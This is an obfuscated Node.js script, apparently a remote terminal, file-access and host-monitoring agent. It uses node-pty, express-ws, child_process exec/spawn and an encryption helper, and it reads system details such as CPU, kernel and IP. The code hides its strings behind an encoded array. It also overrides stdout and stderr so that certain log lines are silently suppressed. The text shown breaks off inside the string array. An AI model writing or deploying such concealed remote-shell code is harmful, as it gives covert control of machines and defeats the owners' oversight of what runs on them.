#!/usr/bin/env node
const a0aY = a0b;
(function (a, b) {
    const aX = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(aX(0x2fa)) / 0x1 + parseInt(aX(0x4e1)) / 0x2 + parseInt(aX(0x7b1)) / 0x3 + parseInt(aX(0x5a7)) / 0x4 * (parseInt(aX(0x59e)) / 0x5) + parseInt(aX(0x38a)) / 0x6 * (-parseInt(aX(0x3f9)) / 0x7) + -parseInt(aX(0x1dc)) / 0x8 * (-parseInt(aX(0x66a)) / 0x9) + -parseInt(aX(0x307)) / 0xa * (parseInt(aX(0x19e)) / 0xb);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x4406e));
const a0c = [
    a0aY(0x5d0),
    a0aY(0x236),
    a0aY(0x25c)
];
function a0d(a) {
    const aZ = a0aY, b = {
            'CELVe': aZ(0xca),
            'eyXBZ': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const b0 = aZ, g = c[b0(0xec)]();
        if (a0c['some'](h => g['includes'](h))) {
            if (typeof f === b[b0(0x674)])
                b[b0(0x223)](f);
            return !![];
        }
        return a['apply'](this, arguments);
    };
}
process['stdout']['write'] = a0d(process['stdout'][a0aY(0x81f)]), process['stderr']['write'] = a0d(process[a0aY(0x57a)]['write']);
const a0f = require('express'), a0g = require(a0aY(0x474)), a0h = require('https'), a0i = require(a0aY(0x405)), a0j = require(a0aY(0x137)), a0k = require(a0aY(0x325)), a0l = require('fs'), a0m = require('fs')['promises'], a0n = require('zlib'), a0o = require(a0aY(0x7d7)), a0p = require('os'), a0q = require(a0aY(0x2bb)), {
        exec: a0r,
        spawn: a0s
    } = require(a0aY(0x14c)), a0t = require(a0aY(0x1d1)), a0u = require(a0aY(0x270)), {encrypt: a0v} = require(a0aY(0x3d5)), a0w = require('base64-js'), a0x = require('express-ws'), a0y = require(a0aY(0x605));
function a0z() {
    const b1 = a0aY, a = {
            'yEHRF': b1(0x688),
            'DniMV': b1(0x31e),
            'dHBmZ': 'export\x20',
            'Yzjxg': function (b, c) {
                return b <= c;
            },
            'jhOKO': function (b, c) {
                return b + c;
            },
            'wwMMA': function (b, c) {
                return b >= c;
            }
        };
    try {
        const b = a0o['join'](__dirname, a[b1(0x260)]);
        if (!a0l[b1(0x291)](b))
            return;
        for (let c of a0l[b1(0x23e)](b, a[b1(0x686)])['split'](/\r?\n/)) {
            let d = c[b1(0x450)]();
            if (!d || d[b1(0x315)]('#'))
                continue;
            if (d[b1(0x315)](a[b1(0x775)]))
                d = d['slice'](0x7)[b1(0x701)]();
            const f = d[b1(0x539)]('=');
            if (a['Yzjxg'](f, 0x0))
                continue;
            const g = d[b1(0x462)](0x0, f)[b1(0x450)]();
            let h = d[b1(0x462)](a['jhOKO'](f, 0x1))[b1(0x450)]();
            a[b1(0x372)](h[b1(0x7bc)], 0x2) && (h[b1(0x315)]('\x22') && h['endsWith']('\x22') || h[b1(0x315)]('\x27') && h[b1(0x344)]('\x27')) && (h = h[b1(0x462)](0x1, -0x1));
            if (g && !(g in process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C;
try {
    typeof Bun !== a0aY(0x72d) ? a0C = require(a0aY(0x317)) : a0C = require('@lydell/node-pty');
} catch (a0aW) {
    console['error'](a0aY(0x225)), console[a0aY(0x1c6)](a0aY(0x271) + a0aW[a0aY(0x5a9)]), console[a0aY(0x1c6)](a0aY(0x5e5)), process['exit'](0x1);
}
const a0D = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const b2 = a0aY, a = {
                'PXtoN': function (b, c) {
                    return b !== c;
                },
                'RDggh': b2(0x72d)
            };
        return a[b2(0x78d)](typeof a0P, a['RDggh']) && a0P['LOG_LEVEL'] !== undefined ? a0P[b2(0xbe)] : 0x2;
    },
    'debug': a => {
        const b3 = a0aY, b = {
                'fYgnl': function (c, d) {
                    return c <= d;
                }
            };
        b[b3(0xb3)](a0D['currentLevel'], a0D['LEVELS'][b3(0x55a)]) && console[b3(0x569)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const b4 = a0aY;
        a0D['currentLevel'] <= a0D[b4(0x13d)][b4(0x4a7)] && console[b4(0x569)](b4(0x1da) + a);
    },
    'warn': a => {
        const b5 = a0aY;
        a0D[b5(0x34c)] <= a0D[b5(0x13d)][b5(0x27d)] && console['log'](b5(0x722) + a);
    },
    'error': a => {
        const b6 = a0aY;
        a0D['currentLevel'] <= a0D[b6(0x13d)][b6(0x13b)] && console[b6(0x569)](b6(0x313) + a);
    }
};
function a0E() {
    const b7 = a0aY, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p['homedir'](),
            process['cwd']()
        ];
    for (const b of a) {
        if (b && a0l['existsSync'](b) && a0l[b7(0x52c)](b)[b7(0xd7)]())
            return b;
    }
    return process[b7(0x5ff)]();
}
function a0F() {
    const b8 = a0aY;
    let a = null;
    try {
        a = a0p[b8(0x7cc)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l['existsSync'](d) && a0l[b8(0x52c)](d)['isDirectory']())
            return d;
        if (d)
            console[b8(0x569)](b8(0x513) + d);
    }
    return console['log']('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20全部候选无效,\x20降级到当前工作目录:\x20' + process[b8(0x5ff)]()), process['cwd']();
}
class a0G {
    constructor(a = 'ok') {
        const b9 = a0aY;
        this[b9(0x75d)] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        const ba = a0aY;
        super(a), this[ba(0x198)] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const bb = a0aY, a = { 'bExUZ': bb(0x63a) }, b = a[bb(0x6b3)][bb(0x493)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bb(0x245)] = null;
                continue;
            case '1':
                this[bb(0x6a9)] = 0x0;
                continue;
            case '2':
                this[bb(0x5af)] = 0x0;
                continue;
            case '3':
                this['ipv4'] = null;
                continue;
            case '4':
                this[bb(0x275)] = '';
                continue;
            case '5':
                this['swap_total'] = 0x0;
                continue;
            case '6':
                super();
                continue;
            case '7':
                this[bb(0x559)] = '';
                continue;
            case '8':
                this[bb(0x705)] = '';
                continue;
            case '9':
                this['cpu_name'] = '';
                continue;
            case '10':
                this[bb(0x839)] = 0x0;
                continue;
            case '11':
                this[bb(0x4f7)] = null;
                continue;
            case '12':
                this['kernel_version'] = '';
                continue;
            case '13':
                this['os'] = '';
                continue;
            case '14':
                this[bb(0x514)] = a0P[bb(0xbd)];
                continue;
            case '15':
                this[bb(0x2b3)] = '';
                continue;
            }
            break;
        }
    }
}
class a0J extends a0G {
    constructor() {
        const bc = a0aY, a = { 'zmDdR': bc(0x281) }, b = a[bc(0x295)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bc(0x4a1)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '1':
                this[bc(0x525)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '2':
                this['network'] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '3':
                this['message'] = '';
                continue;
            case '4':
                this[bc(0x347)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '5':
                this[bc(0x5b9)] = { 'usage': 0x0 };
                continue;
            case '6':
                this[bc(0x6d0)] = 0x0;
                continue;
            case '7':
                this[bc(0x1b8)] = 0x0;
                continue;
            case '8':
                this[bc(0x47f)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '9':
                this['load'] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '10':
                super();
                continue;
            }
            break;
        }
    }
}
function a0a() {
    const gA = [
        'y2XLyw51Ca',
        'Cejuwg4',
        'Ec1LBMnYExb0zwq',
        'mZa0',
        'AxngAwXL',
        'EeDisLm',
        'BwvT',
        't3jcqMu',
        'l2fWAs9IyxnLAw5MBW',
        't2T2qwu',
        'rw5JCNLWDfDPDgHbza',
        'BeLpvNG',
        'yKPyCLO',
        'ChjVy2vZCW',
        'wfHfqMu',
        'EMzZC1e',
        'vxbszui',
        'z2nOz1u',
        'BefPA0y',
        'zgforw0',
        'CvvTB1C',
        'Bejgsgu',
        'uLn3rNa',
        'qxv0AgvUDgLJyxrPB24GzMfPBgvKoIbjBNzHBgLKifrVA2vU',
        'DenXr0q',
        'vxjgvgS',
        'sMfNzNe',
        'C3nRA1K',
        'BgLUAW',
        'y29UDhjVBc1ZDhjLyw0',
        'whrAAKO',
        'yNrXwMu',
        'mJa2',
        'wc1bDxrOlvrVA2vU',
        'u3LZDgvTmZi',
        'C0fYy1y',
        'wMDHCgm',
        'Bwv0yvjLCxvLC3rLza',
        'A2v5x2LK',
        'D1L2A04',
        'vfLXD3e',
        'DNn5q1e',
        'wM9xuMy',
        'CgvT',
        'ruHpr0q',
        'zgvJCNLWDa',
        'wu9gtgy',
        'A3vTrvy',
        'w1rHC2TtDg9Yzv0G4P2mios/NEwTMowKSEI0PsaO5yAf5A2y5lU75yQH5lIn5y+x5B2X5zonktOG',
        'whP1uu8',
        'C29JAW',
        'm3WYFdr8n3WWFdz8mxW1',
        'uvr5rLu',
        'runeu0fFufvcs0vz',
        'lunVBw1HBMq',
        'AMvQDLi',
        'EMzVDfO',
        'yMLTufi',
        'sMHdtMG',
        'rw1yrKe',
        'DKHrsK0',
        'vg5lA3C',
        'DhjPBvn0yxj0',
        'iowKSEI0PtOG',
        'zM9YBwf0ig11C3qGyMuGj2z1BgWNig9YicDZAg9YDcC',
        'zwnPzxnFChvIBgLJx2TLEq',
        'z3b1x25HBwu',
        'Cfv3BwG',
        'twLZC2LUzYbYzxf1AxjLzcbbrvmTr0nnigzPzwXKCYaOBM9Uy2uSihrHzYWGy2LWAgvYDgv4DcKGAw4GCgf5Bg9Hzc4',
        'te9lvMK',
        'yMfKigfJy291BNqGDgfNig9YigHVC3rUyw1L',
        'D3jPDgvvsw50mtzcrq',
        't0DQsvi',
        'CMvTB3zLtgLZDgvUzxi',
        'ywnJzxnZu3LUyW',
        't2X0wfG',
        'B25eB21HAw5dAgfUz2u',
        'DxbSB2fKrMLSzq',
        'tfvPsw8',
        'we1xsKO',
        'BLLKBMi',
        'D29Yzhm',
        'C3rHCNq',
        'zwnKC2fFChvIBgLJx2i2na',
        'qKftruLorK9Fq0fdsevFvfrm',
        'seLIuNK',
        'tevKvgi',
        'y2fJAguTy29UDhjVBa',
        '5lIj5QYH5O+H5OMl5lQK5lQs5zco5lUn5PYQ6l+B5ywLievZDgfIBgLZAgvKioEkTUAaGq',
        'EwDguMi',
        'EfPzv2G',
        '5yQG6l295AsX6lsLoIa',
        '8j+uHcbBq2fJAgvDifn0yxr1CYdLRP7ML7BNM5hMJQFNVjpLRzJLT7lOV4FMNj/VViZLT7lPH43MLRdNLj/MIjdLUQBPH4/LV6VNHAFJGii',
        'y3zKy0S',
        'rfnUqxe',
        'g1SZm21Bv0fstL0BwZbTia',
        'uLrktNm',
        'x2rVC0rHDgvuAw1L',
        'Ec1JAhvUAY1Pza',
        'Ec1MAwXLlxbHDgG',
        'zgvJCNLWDerHDge',
        'CMHxEeu',
        'thHfAge',
        'zNntAxPL',
        'z2v0uMvHBhrPBwvjBMzV',
        'AgfUzgXLsgvHzgvYCW',
        'Dw5KzwzPBMvK',
        'Aw5JB2DUAxrV',
        'wxzgreG',
        'vvv0teK',
        '8j+uKsbBvgvTCeTLEv0G5PAW5lI05PE25A+g6zkL5BEY55sF5OIqoIbRzxLFAwq9',
        'l2rVBwfPBG',
        'qxH2uwS',
        'D2vSy29Tzq',
        't0f5y2G',
        'x2rYywLU',
        'rg5jtMq',
        'DgvTCa',
        'uLz2zM0',
        'B0nqu2O',
        'zvzrA0W',
        'r3P5ufO',
        'D3neB3DUz3jHzgvuB2TLBG',
        'D3jPDgvvsw50qKu',
        'BgLZDgvU',
        'u3fkqMC',
        'yxjNBYb0Dw5UzwWGCMuTCMvNAxn0zxiGzMfPBgvKoIa',
        'vezvAei',
        'y3jLyxrLzf9HDa',
        'Ew55s3K',
        'vfLhyvu',
        'lNrTCc0',
        'vKjYvLm',
        'y010Bwq',
        'CMvHzejPz1vjBNq2neXf',
        'sxbeq28',
        'z0frzNm',
        'AgfZ',
        'ywDLBNq',
        'B3DUzxi',
        'wxHoree',
        'rhD5rxK',
        'zwnPzxnqDwjRzxK',
        'AwTkrve',
        'r2XLueK',
        't2Pyseq',
        'zKnrr24',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'Chr5uhjVy2vZCW',
        'DvPozui',
        'C2vHCMnO',
        'vLn0Cgm',
        'DgvZDa',
        'BgLUzq',
        'C3rHDhvZ',
        'u3rHCNrPBMCGBwfPBIGPigz1BMn0Aw9UlI4U',
        'q2zrzfq',
        'DfvWzu4',
        'EMP1DeK',
        'zw5JCNLWDfjLC3bVBNnL',
        'BMv0D29YA0nVBM5Ly3rPB25Z',
        'rgzKuNO',
        'CvPet0S',
        'Ahr0Chm6lY8',
        'uNzgBem',
        'l2fWAs9MAwXLl2nHDa',
        'uMvZCg9UC2uGzw5JCNLWDgLVBIbMywLSzwq6ia',
        'tNrvyvu',
        'uwPmAvy',
        'CgLK',
        'Dw1mEKi',
        'ExL6rvK',
        'B25cyxnLAw5MB1n1y2nLC3m',
        'DxrMltG',
        'yuTsrLO',
        'tK9ju0vFuK9mrv9jtKLusufut1i',
        'BxvSDgLWyxj0l2zVCM0Tzgf0ytSGyM91BMrHCNK9',
        'BM9YBwfSAxPLu2HLBgXoyw1L',
        'zeHcBvO',
        'AwyTBM9Uzs1TyxrJAa',
        'BMDev3O',
        'r1rZEfe',
        'AxLbEve',
        'vLfvC2q',
        'u0TqBwS',
        'CMvXDwvZDgLUzYbXDwLJAYb0Dw5UzwWGzMfPBgvKoIa',
        'v3nOD3i',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        'C2f2zwrFyxq',
        'mtaW',
        'u3zMDxG',
        'yuDgAwC',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'C2vJCMv0',
        'y2vPBa',
        'yMfKihr1BM5LBcbPza',
        'y3jVBKPVyNm',
        '6kEJ5A+g5AsX6lsLicJLR4BPKQxPLjNOR6/MIjBMLBdMJA7OOQVNR6hMLlKPoIa',
        'wNLmrMi',
        'twf0y2HLzcbtDwiTCgf0AdOG',
        'x3nWBgL0qw5KrMLUAxnO',
        'DMvYAwz5',
        'ufH0B04',
        'ywXSB3DFCMvTB3rLx2nVBMzPzW',
        'B3nsA1C',
        'vhbZDfK',
        'AxnZDwvY',
        'yxv0Ag9YAxPHDgLVBG',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'zxHLy3v0ywjSzq',
        'CgXHDgzVCM0',
        'Ec1VCMLNAw5HBc1WyxrO',
        'w1rHC2TtDg9Yzv0G4P2mieTtve9srv9lrvKG6z2E5RovicJPNiaGyMfZzty0l2HLEcdNVjBNOihNMOqGmZiG5A2x6iQcksWG5lU75yQH5OYb5lMf5yYw5l+D5OYb5ywZ6zET',
        'zxjYB3jLza',
        'BvLttuG',
        'C2HVCNqGq2fWj24GuhjVDg8GCMv0DxjU',
        'ntbTyG',
        'yxjNBYb0Dw5UzwWG',
        'ELbLyvO',
        'A2zOvg8',
        'u3jywwq',
        '8j+sPsdMJ6hMIyVLPlhOTkxOR6BMG4u6ia',
        'DMfSAwrHDgu',
        'Aw5JBhvKzxm',
        'w+E7IoERR+s8MUIVNsa',
        'CMvZB2X2zurVBwfPBKzPBgvqyxrO',
        'BgLZDezPBgvZ',
        'qNHwA04',
        'zNPZsLK',
        'u2v0lvbtuMvHzeXPBMvpChrPB24GluHPC3rVCNLtyxzLu3r5BguGu2f2zu5VDgHPBMC',
        'Cg9YDa',
        'BeHyAKi',
        'rMPls04',
        'u2zhCxi',
        'BMvLza',
        'wxjPt2e',
        'D3jPDgvvsw50mtzmrq',
        'z2v0qMfZAwnjBMzV',
        'oda5mdeZA3vos2Pg',
        'zhLUyw1PyW',
        'y2yTChjVEhKT',
        'qKHWC2i',
        'C0fMA08',
        'qwDgv3O',
        'C0Llq1m',
        'y3btEw5J',
        'y2yTAw50lq',
        'DwDZExq',
        'CMvHzfvjBNqXnKjf',
        'BgvUz3rO',
        'wNbwsgu',
        'zhD4vwW',
        'CLbeuuK',
        'CLbWAfm',
        'A2LZyw1HlxDZlxrVA2vUlxyX',
        '4PQG77IpienVBLbuwsdLKk/LIQJLPlhOTkxVViZLM57PGidNRQhPGzpMQkhLVi86ia',
        'uKPirMW',
        'DeTbAgq',
        'w1rHC2TtDg9Yzv0G4P2mia',
        'DxzMuwy',
        'zu5rveC',
        'CxvLCNK',
        'zw5JCNLWDgvK',
        'z2vUzxjHDgvqywLY',
        'zK15Chm',
        'Ag9TzwrPCG',
        'DhvUBMvSx2rVBwfPBG',
        'yxbWBgLJyxrPB24VD2fZBq',
        'u2fRC2q',
        'tvb4tey',
        'ru9OueO',
        'Dw5RBM93BIbLCNjVCG',
        'Bg1WtKO',
        'u0Lhsu5uigHHBMrSzxiGCMvNAxn0zxjLza',
        'zfnAzLa',
        'svb2na',
        'Cgf0Aa',
        'BMv0D29YA1n0yxrZ',
        'oNbHDgG',
        'Ec1LBMnYExb0zwqSihGTywDLBNqTDMvYC2LVBIWGEc1MAwXLlxnPEMuSihGTB3jPz2LUywWTCgf0Aa',
        'Dw5SAw5Ru3LUyW',
        'CMvQzwn0',
        'z2v0',
        'Cgf0AcbYzxf1AxjLza',
        'Cfvwt1C',
        'DK5Hu0W',
        'q3bzAxe',
        'CM91BMq',
        'zgvMBgf0zvjHD1n5BMm',
        'tM9PC2uGv0fttsbTB2r1BguGBM90igf2ywLSywjSzq',
        'lcdLJP/MLOFKU7BLT7lPMPtNPRS6ia',
        'AxDtCNa',
        'rvfQzxm',
        'BhHYBNq',
        'r2v0qwn0Aw9U',
        'txfoDvi',
        'sw52ywXPzcbJCM9Uigv4ChjLC3nPB25ZoIa',
        'BM90igfUifjqqYbYzxr1CM4GBwvZC2fNzq',
        'rLHuENa',
        'CMvJDKnPCgHLCG',
        'Bhrsze8',
        'tM9Uzq',
        'y29UDgfPBMvYpwX4yW',
        'q29dCeO',
        'icHltKfnrt0',
        'C3vIAMvJDcbdtIbTAxnTyxrJAa',
        'CuXgD0u',
        'zwnPzxnFChvIBgLJx2i2na',
        'y3vYCMvUDeXVywq',
        'zhLUyw1Py1nPEMu',
        'shjbqva',
        'y2LWAgvY',
        'CvPZsgG',
        'qMnRBK4',
        'y29UBMvJDgLVBIbJBg9Zzwq',
        'EhDcB1u',
        'vuL5v1C',
        'DLreCe8',
        'DxD4zum',
        'u1vzA3a',
        'v1bPrvK',
        'D3v3sLa',
        'C3vIyxjYyxK',
        'C3LAywC',
        'zwnKC2fFChjPDMf0zv9OzxG',
        'AvLYyLG',
        'CMvNAxn0zxjLza',
        'A2v5CW',
        'ywn0AxzHDgu',
        'BM90x2zVDw5K',
        'qLnnt28',
        'q1L2rhe',
        'C3rHDgu',
        'AeDHwNy',
        'v0HHuNy',
        'Aw1Hz2uVEc1Py29U',
        'uNvAvfu',
        'Cg9YDcbTDxn0igjLigfUigLUDgvNzxiGyMv0D2vLBIaXigfUzca2ntuZnq',
        'AxnZDwvYie8GBwLZBwf0y2G6ia',
        'Cu9mCxe',
        'l3bYB2mVC2vSzI9TB3vUDgLUzM8',
        'CgfKu3rHCNq',
        't1jhz1K',
        'uwD1sMu',
        'B3bLBLn5BMm',
        'v3fkD2O',
        'lJaWmfO',
        'mxWYFdr8mhWZ',
        'D3jPDgu',
        'l3bVzhmV',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        'ChjVEhKTyxv0AgvUDgLJyxrL',
        'C3rYAw5NAwz5',
        'q2XVDwrgBgfYzsbpCMLNAw4Gu1nm',
        'Aw1Hz2uVANbLzW',
        'zwnPzxnFChjPDMf0zv9RzxK',
        'AMHgAgW',
        'whj3zvC',
        'D3bdC0S',
        'B2HiuvO',
        'vg1YDgO',
        'EKfcEvu',
        'uLHQwKC',
        'zxHWzwn0zwqGq2fWj24GuhjVDg8GC3rYDwn0ihbVAw50zxi',
        'quvtievUy3j5ChqGrxjYB3i6ia',
        'qKXRv3q',
        'l2fWAs9MAwXLl2rVD25SB2fK',
        'CMfUzg9T',
        'x3rHC2TRAwXSvhjLzq',
        'qNv5C0O',
        'CMvZDwX0',
        'yMXkyw8',
        'runeu0fFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvTios4JEwTMowCQa',
        'ywn0AxzL',
        'y3b1x2nVCMvZ',
        'BwLWyve',
        'ihDPDgGGzg9TywLUia',
        'CMvUyw1Lu3LUyW',
        'D3jPDgvtEw5J',
        'zMLSzxm',
        '8j+uKcdMO4dMTyVLIlaGvg9Rzw7VViZOP4BKUlOGv1ntioMtVUI3R++8JoI3S+I/HYboB2LZzq',
        'q2fWj24GuhjVDg8GCg9PBNrLCIbVDxqGB2yGyM91BMrZ',
        's3fVCfi',
        'tfHd',
        'AhvQvwi',
        'CenKqu4',
        'D2LUmZi',
        'EgvRyva',
        'thn0vgG',
        'wgPtt0O',
        'B011uhK',
        'zfz1wuS',
        'qY5vveyToa',
        'D2zMAM0',
        'AxrLBxm',
        'CMvHzgfIBgu',
        'm3WWFdj8nhWX',
        'tKDwwha',
        'sNvgALG',
        'C2v0t25LDgLTzvrHC2TZ',
        'r1rPEgG',
        'zwrNzsbKAwqGBM90ig5Lz290Awf0zsbOmG',
        'v2zRswW',
        'wfHrDgq',
        'veznzKq',
        'CMvHzfvjBNqZmKjf',
        'DNPwsuu',
        'C2v0q3jVBLrHC2TZ',
        'BMf0AxzL',
        'revnshu',
        't0jqwhK',
        'ic0Tls0G',
        'Ahnvzxm',
        'z2v0qxv0AfrHzW',
        'ufPVv0S',
        'ieHuvfaVms4X',
        'svfzy0K',
        'DxnLtM9PC2u',
        'tuDXuwq',
        'zLLNBMW',
        'D2TZvKm',
        'wwfHy2G',
        'C29gqM4',
        'qg5VyMXLl2n1CNzLCY9UAxn0lMPZ',
        'wc1oB25Jzq',
        'v3rIrMG',
        'DM52zwC',
        'DJeUma',
        'wurevKq',
        'quDftLrFvKvsu0LptG',
        'te9hx0XfvKvm',
        'twLZC2LUzYbHDxrOigHLywrLCNm',
        'veTIvgK',
        'tMrAsKC',
        'D2vIC29JA2v0ihn0CMvHBsa',
        'qMfKihnPz25HDhvYzq',
        'Ahr0Chm6lY9ZAhOUywWVFG',
        'w0Tnt0rfxsdIMQdVUi8G5z+F5zcn5PAh5lU25yAz5ywL5AsX6lsLicG',
        't1busu9ouW',
        'thHywve',
        'vfDZyNa',
        '8j+uHcbBu0vdvvjjvfLDios4ToAxTUwVHUMsPEI/H+ACNYWG5BEY6l2U5O2Iifnfu1njt05Fs0vzios4JUAoP+wiTUERRYboB2LZzsdLR4BPKQxLR7KGkowqIoAZLEAoP+wiTUERR+MCGoMhJEAwSoIUPoIVGEIoT+wpLIbIyxnLAw5MBYdMLRdLR4BPKQuP',
        'zNvUy3rPB24',
        'B3zQr0G',
        'D3b0q1a',
        'tvvNBuG',
        'AgvHzgvYCW',
        'Dgv4Dc9QyxzHC2nYAxb0oYbJAgfYC2v0pxv0zI04',
        'koACQUIUVUE9RIWG57Y655Yb5Asn55sOieToqu1fkq',
        'z2v0uhvIBgLJs2v5',
        'uNH2rem',
        'AKf0vxy',
        'ExLSBK4',
        'C2vUzerHDge',
        'v19psW',
        'AxneAxjLy3rVCNK',
        'ywLjt3u',
        'CxvPy2SGDhvUBMvSihjLCxvLC3qGD2fZihjLAMvJDgvKoIa',
        'lNvWBg9Hzf9JAhvUA3m',
        'vK5Wu3i',
        'sfbbq0SGzhLUyw1PyYbPBMrLEcbVDxqGB2yGCMfUz2u',
        'BKLksvm',
        'z3rsruO',
        'BNvTyMvY',
        'yNL0zuXLBMD0Aa',
        'BgfZDfnHDMvKqxq',
        't1Dlwxy',
        'zM5Ote0',
        'rMPfsva',
        'Ae1fzxG',
        'y2fSBa',
        'vNPeCMC',
        'sKDrueu',
        'ue9sva',
        'B3LtEw8',
        'y2yTy2XVDwrMBgfYzwqTChjVEhKTy29UBMvJDgLVBI11CgDYywrL',
        'Dg9tDhjPBMC',
        'CMvWBgfJzq',
        'vevstq',
        'rfnJEKi',
        'y3jLyxrLq2LWAgvYAxy',
        'D3jPDgvuzxH0tgLZDa',
        'yxbWBgLJyxrPB24VEg1S',
        'ufLTrLe',
        'C2vUzezYyw1L',
        'CMvNAxn0CMf0Aw9UrMfPBgvK',
        'oNn0yxr1CW',
        'x2jHC2vPBMzVx2nHy2HLx3rPBwu',
        'C3DHChrVDgfS',
        'q2XVC2LUzYbJB25Uzwn0Aw9Uigr1zsb0BYbTAxnZAw5NihjLCxvLC3rFAwq',
        'q3j5ChrVtwfUywDLCIbPBML0AwfSAxPLza',
        'zMLSDgvY',
        'z2v0tg9Nu3vTBwfYEq',
        'zgvSzxrL',
        'D2vIC29JA2v0',
        '4PYfie5VAxnLioApOEAjI+wUJoAiKo+8JoERR+wiSoERR+wkOowVHUMaMUMbK+w3SUw7UUERI++8Gq',
        's21Wweu',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'y3jLyxrLvMvYAwz5',
        'ywjVs2C',
        'tvDlBNa',
        'quvtierLy3j5ChqGrxjYB3i6ia',
        'tufyx1vqte9brf9tsvPf',
        'z3fRq1y',
        'zMnpzvO',
        'uwvezKW',
        'vhrQB00',
        'Dw5jEMW',
        'vw5ZDxbWB3j0zwqGCgvYBwLZC2LVBIbMB3jTyxqSig9UBhKGB2n0ywWGC3rYAw5NCYbHCMuGC3vWCg9YDgvK',
        'D2fYBG',
        'vM5rB3C',
        '5yQG5A+g5O+H5OMl5AsX6lsL',
        'se9tva',
        'w0Tnt0rfxsdWN5QaieTnt0rfpti6ioMAP+MbK+wFN+wqJEwWHUs4IUAkPEIhS+wKLUMdQow5S+wpSa',
        'C2vRs1a',
        'BwfSzM9YBwvKieHuvfaVms4XihjLC3bVBNnLihn0yxr1CW',
        'z2v0u2vJB25KCW',
        'wLjut04',
        'uLrnwhK',
        'EgzxEKu',
        'y3jLyxrLuhvIBgLJs2v5',
        'l2fWAs9MAwXLl3PPCa',
        'CMvMzxjLCG',
        'ioIVT+AXGUw8GUw4UdOG',
        'w0Tnt0rfxsb0Dw5UzwWGzg9TywLUig5VDcbYzwfKEq',
        'y2XVC2vtEw5J',
        'A3H4C24',
        'x3nLBMrxzwXJB21L',
        'BNLMs1C',
        'vMHdt3e',
        'y29Yzxm',
        'EKjIEfG',
        'zgLYzwn0B3j5',
        'AvPAvuK',
        'AvfJqMG',
        'l2fWAs90yxnRl29UzxrPBwuVzxHLy3v0zq',
        'CNvUuhjVBwLZzq',
        'shfju28',
        'y29Uy2f0',
        'qufJzey',
        'z2vUzxjHDgvtAw5NBgu',
        'zgjVv1i',
        'qxzirMC',
        'qufizfe',
        'wLDYz00',
        'y2H1BMTF',
        'ChbVyMG',
        'CMvXDwvZDa',
        'DwfJD0W',
        'z2v0t25LDgLTzuXVz3m',
        'ktOG',
        'DgXZ',
        'nhWWFdj8mxWZ',
        'Cuj4r2u',
        'mxWZFdr8mhWY',
        'rvjst1i',
        'AxnbyNnVBhv0zq',
        'tevwruXt',
        'w1DbuK5Diev4y2vWDgLVBIbSB2fKAw5Nie5VAxnLig1VzhvSztO',
        'EvflENO',
        'AMDnruO',
        'ChjVyW',
        'teL3Aw8',
        'Bwf4lwzVCNDHCMrZ',
        'q1jptL9dsevds19jtLrfuLzbta',
        's1PetgS',
        'yMfZzw5HBwu',
        'DgnW',
        'zM9YrwfJAa',
        'Dw5Oyw5KBgvKuMvQzwn0Aw9U',
        'vuLOzNa',
        'weHmqw4',
        'y2HPBgrFChjVy2vZCW',
        'twDdB3y',
        'wNreAM8',
        'w0Tnt0rfxsdWN5QaieTnt0rfpte6iowqR+wkQoAxTUIhQUwkQowiM+w7UUs4ToAxTUMAP+MbKW',
        'y0PdvMW',
        'z2v0qwn0AxzLrwnKC2fwAW',
        'Euf4A1K',
        'sgz4Bu4',
        'y3jLyxrLzef0',
        'wc1uAw1LC3rHBxa',
        'BLzeD3i',
        'C0j0wxy',
        'x3jLy2vPDMvxC0j5DgvZ',
        'C1zhAue',
        'z2Xxq0C',
        'l2rLDI8',
        'yvvowxu',
        'zMXVB3i',
        'zg9pt1y',
        'Cg9ZDa',
        's1HmtKW',
        'DuHkA04',
        'x2jHC2vPBMzVx2nHy2HL',
        'BMLPAhK',
        'DhvUBMvSu3rHDgu',
        'BLvQyMG',
        'quzRAgu',
        'sfbbq0SGAw50zwDLCIb0B28GBgfYz2u',
        'rKTOqNa',
        'CMvHzhLtDgf0zq',
        'ExrPu00',
        'y29zt1K',
        'AeTJBMK',
        'AM9PBG',
        'x2DLDenVBMzPz1zHBhvL',
        'A2LSBgvK',
        'ELjcCxC',
        'zw5HAMC',
        'DffPBKm',
        'DxbKyxrLlwnVBMzPz3vYyxrPB24',
        'tfD2BwG',
        'BKLfs1a',
        'ywnJzxb0lwXHBMD1ywDL',
        'ic0+ia',
